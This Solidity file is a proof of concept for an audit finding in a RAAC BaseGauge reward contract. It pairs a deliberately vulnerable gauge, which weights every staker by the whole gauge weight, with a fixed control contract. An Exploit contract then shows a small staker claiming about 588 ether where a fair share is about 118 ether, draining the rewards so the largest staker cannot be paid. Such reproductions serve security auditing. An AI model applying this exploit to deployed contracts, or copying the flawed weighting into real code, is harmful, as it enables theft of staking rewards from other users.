// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  RAAC BaseGauge — Codehawks Feb 2025, finding 57201.
    _getBaseWeight returns the gauge weight for every account. With ve
    balances at zero, calculateBoost returns minBoost (1e18), so every
    staker is weighted at 10000 ether. Three stakes of 10000, 5000, and
    2000 each earn 588.235 ether from a 1000 ether notification.
    The 2000-ether staker is paid that full slice. The control weights by
    stake and pays 117.647 ether.
*/

contract Token {
    string public symbol = "RWD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IGaugeController {
    function getGaugeWeight(address gauge) external view returns (uint256);
    function veRAACToken() external view returns (address);
}

interface IERC20Lite {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

contract GaugeController is IGaugeController, IERC20Lite {
    uint256 public weight;

    constructor(uint256 gaugeWeight) {
        weight = gaugeWeight;
    }

    function getGaugeWeight(address) external view returns (uint256) {
        return weight;
    }

    function veRAACToken() external view returns (address) {
        return address(this);
    }

    function balanceOf(address) external pure returns (uint256) {
        return 0;
    }

    function totalSupply() external pure returns (uint256) {
        return 0;
    }
}

contract BaseGauge {
    Token public rewardToken;
    address public controller;
    uint256 public rewardPerToken;
    mapping(address => uint256) public stakeOf;

    constructor(Token token, address controller_, uint256 index) {
        rewardToken = token;
        controller = controller_;
        rewardPerToken = index;
    }

    function setStake(address account, uint256 amount) external {
        stakeOf[account] = amount;
    }

    function _getBaseWeight(address account) internal view virtual returns (uint256) {
        // @> VULN: base weight is the gauge weight, not account's stake, so every staker is weighted the same
        return IGaugeController(controller).getGaugeWeight(address(this));
    }

    function calculateBoost(uint256 veBalance, uint256 totalVeSupply) internal pure returns (uint256) {
        if (veBalance == 0 || totalVeSupply == 0) return 1e18;
        return 1e18;
    }

    function _applyBoost(address account, uint256 baseWeight) internal view virtual returns (uint256) {
        if (baseWeight == 0) return 0;
        IERC20Lite veToken = IERC20Lite(IGaugeController(controller).veRAACToken());
        uint256 veBalance = veToken.balanceOf(account);
        uint256 totalVeSupply = veToken.totalSupply();
        uint256 boost = calculateBoost(veBalance, totalVeSupply);
        return (baseWeight * boost) / 1e18;
    }

    function earned(address account) public view returns (uint256) {
        uint256 baseWeight = _getBaseWeight(account);
        uint256 weight = _applyBoost(account, baseWeight);
        return (weight * rewardPerToken) / 1e18;
    }

    function claim() external returns (uint256 amt) {
        amt = earned(msg.sender);
        require(rewardToken.transfer(msg.sender, amt), "pay");
    }
}

contract BaseGaugeFixed {
    Token public rewardToken;
    uint256 public rewardPerToken;
    mapping(address => uint256) public stakeOf;

    constructor(Token token, uint256 index) {
        rewardToken = token;
        rewardPerToken = index;
    }

    function setStake(address account, uint256 amount) external {
        stakeOf[account] = amount;
    }

    function _getBaseWeight(address account) internal view returns (uint256) {
        return stakeOf[account];
    }

    function earned(address account) public view returns (uint256) {
        return (_getBaseWeight(account) * rewardPerToken) / 1e18;
    }

    function claim() external returns (uint256 amt) {
        amt = earned(msg.sender);
        require(rewardToken.transfer(msg.sender, amt), "pay");
    }
}

contract Exploit {
    uint256 public constant SMALL = 2000 ether;
    uint256 public constant MID = 5000 ether;
    uint256 public constant WHALE_STAKE = 10000 ether;
    uint256 public constant REWARD = 1000 ether;
    uint256 public constant GAUGE_WEIGHT = 10000 ether;
    address public constant whale = address(uint160(0xBEEF));

    Token public token;
    GaugeController public controller;
    BaseGauge public gauge;
    uint256 public received;
    uint256 public fair;

    constructor() {
        token = new Token();
        controller = new GaugeController(GAUGE_WEIGHT);
        uint256 index = (REWARD * 1e18) / (SMALL + MID + WHALE_STAKE);
        gauge = new BaseGauge(token, address(controller), index);
        gauge.setStake(address(this), SMALL);
        gauge.setStake(whale, WHALE_STAKE);
        gauge.setStake(address(uint160(0xCAFE)), MID);
        token.mint(address(gauge), REWARD);
        fair = (SMALL * REWARD) / (SMALL + MID + WHALE_STAKE);
    }

    function run() external {
        uint256 mine = gauge.earned(address(this));
        uint256 whaleEarned = gauge.earned(whale);
        require(mine == whaleEarned, "equal weights");
        require(mine > fair, "above fair");
        received = gauge.claim();
        uint256 left = token.balanceOf(address(gauge));
        require(received == mine, "paid the gauge weight");
        require(left < whaleEarned, "whale cannot be paid");
        require(received == 588235294117647050000, "slice");
    }
}
